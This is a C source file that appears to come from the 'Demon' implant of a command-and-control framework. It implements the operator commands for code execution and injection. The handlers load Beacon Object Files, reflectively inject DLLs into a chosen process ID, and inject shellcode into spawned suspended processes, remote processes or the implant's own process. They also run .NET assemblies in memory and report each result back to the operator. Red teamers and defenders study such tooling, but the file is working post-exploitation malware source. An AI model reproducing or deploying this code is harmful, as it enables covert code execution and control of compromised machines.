#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>
#include <commands/Command_Inject.h>

VOID CommandInlineExecute( PPARSER Parser )
{
    UINT32    FunctionNameSize = 0;
    DWORD     ObjectDataSize   = 0;
    PCHAR     ArgBuffer        = NULL;
    UINT32    ArgSize          = 0;
    PCHAR     ObjectData       = NULL;
    PMEM_FILE BofMemFile       = NULL;
    PMEM_FILE ParamsMemFile    = NULL;
    UINT32    RequestID        = Instance->CurrentRequestID;
    PCHAR     FunctionName     = ParserGetString( Parser, &FunctionNameSize );
    ULONG     BofFileID        = ParserGetInt32( Parser );
    ULONG     ParamsFileID     = ParserGetInt32( Parser );
    INT32     Flags            = ParserGetInt32( Parser );

    BofMemFile = GetMemFile( BofFileID );
    if ( BofMemFile && BofMemFile->IsCompleted )
    {
        ObjectData     = BofMemFile->Data;
        ObjectDataSize = BofMemFile->Size;
    }
    else if ( BofMemFile && ! BofMemFile->IsCompleted )
    {
        PRINTF( "BofMemFile [%x] was not completed\n", BofFileID );
        goto CLEANUP;
    }
    else
    {
        PRINTF( "BofMemFile [%x] not found\n", BofFileID );
        goto CLEANUP;
    }

    ParamsMemFile = GetMemFile( ParamsFileID );
    if ( ParamsMemFile && ParamsMemFile->IsCompleted )
    {
        ArgBuffer = ParamsMemFile->Data;
        ArgSize   = ParamsMemFile->Size;
    }
    else if ( ParamsMemFile && ! ParamsMemFile->IsCompleted )
    {
        PRINTF( "ParamsMemFile [%x] was not completed\n", ParamsFileID );
        goto CLEANUP;
    }
    else
    {
        PRINTF( "ParamsMemFile [%x] not found\n", ParamsFileID );
        goto CLEANUP;
    }

    switch ( Flags )
    {
        case 0:
        {
            PUTS( "Use Non-Threaded CoffeeLdr" )
            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
            break;
        }

        case 1:
        {
            PUTS( "Use Threaded CoffeeRunner" )
            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
            break;
        }

        default:
        {
            PUTS( "Use default (from config) CoffeeLdr" )

            if ( Instance->Config.Implant.CoffeeThreaded )
            {
                PUTS( "Config is set to threaded" )
                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
            }
            else
            {
                PUTS( "Config is set to non-threaded" )
                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
            }

            break;
        }
    }

CLEANUP:
    RemoveMemFile( BofFileID );
    RemoveMemFile( ParamsFileID );
}

VOID CommandInjectDLL( PPARSER Parser )
{
    PPACKAGE          Package    = PackageCreate( DEMON_COMMAND_INJECT_DLL );

    UINT32            DllSize    = 0;
    DWORD             Result     = 1;
    NTSTATUS          NtStatus   = STATUS_UNSUCCESSFUL;
    PBYTE             DllBytes   = NULL;
    UINT32            DllLdrSize = 0;
    PBYTE             DllLdr     = NULL;
    HANDLE            hProcess   = NULL;
    OBJECT_ATTRIBUTES ObjAttr    = { sizeof( ObjAttr ) };
    INJECTION_CTX     InjCtx     = { 0 };

    InjCtx.Technique = ParserGetInt32( Parser );
    InjCtx.ProcessID = ParserGetInt32( Parser );
    DllLdr           = ParserGetBytes( Parser, &DllLdrSize );
    DllBytes         = ParserGetBytes( Parser, &DllSize );
    InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );

    PUTS( "CommandInjectDLL" )
    PRINTF( "Technique: %d\n", InjCtx.Technique )
    PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
    PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
    PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );

    hProcess = ProcessOpen( InjCtx.ProcessID, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION );

    if ( hProcess )
    {
        Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
        SysNtClose( hProcess );
    }
    else
    {
        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
    }

    PRINTF( "Injected Result: %d\n", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package );
}

VOID CommandSpawnDLL( PPARSER Parser )
{
    PPACKAGE      Package    = NULL;
    INJECTION_CTX InjCtx     = { 0 };
    UINT32        DllSize    = 0;
    UINT32        ArgSize    = 0;
    UINT32        DllLdrSize = 0;
    PCHAR         DllLdr     = ParserGetString( Parser, &DllLdrSize );
    PCHAR         DllBytes   = ParserGetString( Parser, &DllSize );
    PCHAR         Arguments  = ParserGetString( Parser, &ArgSize );
    DWORD         Result     = 0;

    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
    Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );

    PackageAddInt32( Package, Result );
    PackageTransmit( Package );
}

VOID CommandInjectShellcode(
    IN PPARSER Parser
) {
    PPACKAGE  Package = NULL;
    DWORD     Status  = INJECT_ERROR_FAILED;
    DWORD     Way     = FALSE;
    DWORD     Method  = 0;
    BOOL      x64     = FALSE;
    PVOID     Payload = NULL;
    UINT32    Size    = 0;
    PVOID     Argv    = NULL;
    UINT32    Argc    = 0;
    DWORD     Pid     = 0;
    LPWSTR    Spawn   = NULL;
    PROC_INFO PcInfo  = { 0 };

    /* create response package */
    Package = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );

    /* parse arguments */
    Way     = ParserGetInt32( Parser );
    Method  = ParserGetInt32( Parser );
    x64     = ParserGetInt32( Parser );
    Payload = ParserGetBytes( Parser, &Size );
    Argv    = ParserGetBytes( Parser, &Argc );
    Pid     = ParserGetInt32( Parser );

    PRINTF(
        "Injection Args:      \n"
        " - Way     : %d      \n"
        " - Method  : %d      \n"
        " - x64     : %s      \n"
        " - Payload : %p : %d \n"
        " - Arg     : %p : %d \n"
        " - Pid     : %d      \n",
        Way,
        Method,
        x64 ? "TRUE" : "FALSE",
        Payload, Size,
        Argv, Argc,
        Pid
    )

    /* dispatch injection way */
    switch ( Way )
    {
        case INJECT_WAY_SPAWN: PUTS( "INJECT_WAY_SPAWN" ) {
            /* use configured target process */
            if ( x64 ) {
                Spawn = Instance->Config.Process.Spawn64;
            } else {
                Spawn = Instance->Config.Process.Spawn86;
            }

            PRINTF( "Target spawn process: %ls\n", Spawn )

            /* create process */
            if ( ProcessCreate( ( ! x64 ), NULL, Spawn, CREATE_NO_WINDOW | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, &PcInfo, FALSE, NULL ) ) {
                PRINTF( "ProcessId is %d\n", PcInfo.dwProcessId );

                /* inject code */
                Status = Inject( Method, PcInfo.hProcess, 0, x64, Payload, Size, 0, Argv, Argc );

                /* terminate process if injection failed */
                if ( Status != INJECT_ERROR_SUCCESS ) {
                    ProcessTerminate( PcInfo.hProcess, 0 );
                }

                /* close process handle */
                if ( PcInfo.hProcess ) {
                    SysNtClose( PcInfo.hProcess );
                }

                /* close thread handle */
                if ( PcInfo.hThread ) {
                    SysNtClose( PcInfo.hThread );
                }

                /* clear struct from stack */
                RtlSecureZeroMemory( &PcInfo, sizeof( PROC_INFO ) );
            } else {
                PRINTF( "Failed to create process: %d\n", NtGetLastError() )
            }

            break;
        }

        case INJECT_WAY_INJECT: PUTS( "INJECT_WAY_INJECT" ) {
            Status = Inject( Method, NULL, Pid, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
            break;
        }

        case INJECT_WAY_EXECUTE: PUTS( "INJECT_WAY_EXECUTE" ) {
            Status = Inject( Method, NtCurrentProcess(), 0, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
            break;
        }

        default: {
            PRINTF( "Injection way not found: %d\n", Way )
        }
    }


    PackageAddInt32( Package, Status );
    PackageTransmit( Package );
}

VOID CommandAssemblyInlineExecute( PPARSER Parser )
{
    if ( ! Instance->Dotnet )
    {
        BUFFER Buffer       = { 0 };
        BUFFER AssemblyData = { 0 };
        BUFFER AssemblyArgs = { 0 };

        Instance->Dotnet = MmHeapAlloc( sizeof( DOTNET_ARGS ) );
        if ( ! Instance->Dotnet ) return;
        Instance->Dotnet->RequestID = Instance->CurrentRequestID;
        Instance->Dotnet->Invoked   = FALSE;

        /* Parse Pipe Name */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance->Dotnet->PipeName.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        if ( Instance->Dotnet->PipeName.Buffer ) {
            Instance->Dotnet->PipeName.Length = Buffer.Length;
            MemCopy( Instance->Dotnet->PipeName.Buffer, Buffer.Buffer, Instance->Dotnet->PipeName.Length );
        }

        /* Parse AppDomain Name */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance->Dotnet->AppDomainName.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        if ( Instance->Dotnet->AppDomainName.Buffer ) {
            Instance->Dotnet->AppDomainName.Length = Buffer.Length;
            MemCopy( Instance->Dotnet->AppDomainName.Buffer, Buffer.Buffer, Instance->Dotnet->AppDomainName.Length );
        }

        /* Parse Net Version */
        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
        Instance->Dotnet->NetVersion.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        if ( Instance->Dotnet->NetVersion.Buffer ) {
            Instance->Dotnet->NetVersion.Length = Buffer.Length;
            MemCopy( Instance->Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance->Dotnet->NetVersion.Length );
        }

        /* Parse Assembly MemFile */
        ULONG32 MemFileID = ParserGetInt32( Parser );
        PMEM_FILE MemFile = GetMemFile( MemFileID );
        AssemblyData.Buffer = NULL;
        AssemblyData.Length = 0;

        if ( MemFile && MemFile->IsCompleted )
        {
            AssemblyData.Buffer = MemFile->Data;
            AssemblyData.Length = MemFile->Size;
        }
        else if ( MemFile && ! MemFile->IsCompleted )
        {
            PRINTF( "MemFile [%x] was not completed\n", MemFileID );
        }
        else
        {
            PRINTF( "MemFile [%x] not found\n", MemFileID );
        }

        /* Parse Argument - assign length into AssemblyArgs.Length, not Buffer.Length */
        AssemblyArgs.Buffer = ParserGetWString( Parser, &AssemblyArgs.Length );

        PRINTF(
            "Parsed Arguments:         \n"
            " - PipeName     [%d]: %ls \n"
            " - AppDomain    [%d]: %ls \n"
            " - NetString    [%d]: %ls \n"
            " - AssemblyArgs [%d]: %ls \n"
            " - AssemblyData [%d]: %p  \n",
            Instance->Dotnet->PipeName.Length,      Instance->Dotnet->PipeName.Buffer,
            Instance->Dotnet->AppDomainName.Length, Instance->Dotnet->AppDomainName.Buffer,
            Instance->Dotnet->NetVersion.Length,    Instance->Dotnet->NetVersion.Buffer,
            AssemblyArgs.Length,                   AssemblyArgs.Buffer,
            AssemblyData.Length,                   AssemblyData.Buffer
        )

        if ( ! DotnetExecute( AssemblyData, AssemblyArgs ) )
        {
            PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
            PackageAddInt32( Package, DOTNET_INFO_FAILED );
            PackageTransmit( Package );

            DotnetClose();
        }

        PUTS( "Finished with Assembly inline execute" )
    }
    else
    {
        PUTS( "Dotnet instance already running." )
    }
}

VOID CommandAssemblyListVersion( PPARSER Parser )
{
    PPACKAGE         Package      = PackageCreate( DEMON_COMMAND_ASSEMBLY_VERSIONS );
    PICLRMetaHost    pClrMetaHost = { NULL };
    PIEnumUnknown    pEnumClr     = { NULL };
    PICLRRuntimeInfo pRunTimeInfo = { NULL };

    if ( RtMscoree() )
    {
        if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&pClrMetaHost ) == S_OK )
        {
            if ( ( pClrMetaHost )->lpVtbl->EnumerateInstalledRuntimes( pClrMetaHost, &pEnumClr ) == S_OK )
            {
                DWORD dwStringSize = 0;
                while ( TRUE )
                {
                    IUnknown *UPTR      = { 0 };
                    ULONG    fetched    = 0;

                    if ( pEnumClr->lpVtbl->Next( pEnumClr, 1, &UPTR, &fetched ) == S_OK )
                    {
                        pRunTimeInfo = ( PICLRRuntimeInfo ) UPTR;
                        if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, NULL, &dwStringSize ) == HRESULT_FROM_WIN32( ERROR_INSUFFICIENT_BUFFER ) && dwStringSize > 0 )
                        {
                            LPVOID Version = Instance->Win32.LocalAlloc( LPTR, dwStringSize );

                            if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, Version, &dwStringSize ) == S_OK )
                            {
                                PRINTF( "Version[ %d ]: %ls\n", dwStringSize, Version );
                                PackageAddWString( Package, Version );
                            }

                            Instance->Win32.LocalFree( Version );
                            Version = NULL;
                            dwStringSize = 0;
                        }
                        else
                            PUTS("Failed get Version String")
                    }
                    else break;
                }
            }
            else
                PUTS("Failed to enumerate")
        }
        else
            PUTS("Failed to CLRCreateInstance");
    }
    else
        PUTS("Failed to load mscoree.dll")


    if ( pClrMetaHost )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }

    if ( pEnumClr )
    {
        pEnumClr->lpVtbl->Release( pEnumClr );
        pEnumClr = NULL;
    }

    if ( pRunTimeInfo )
    {
        pRunTimeInfo->lpVtbl->Release( pRunTimeInfo );
        pRunTimeInfo = NULL;
    }

    PackageTransmit( Package );
}
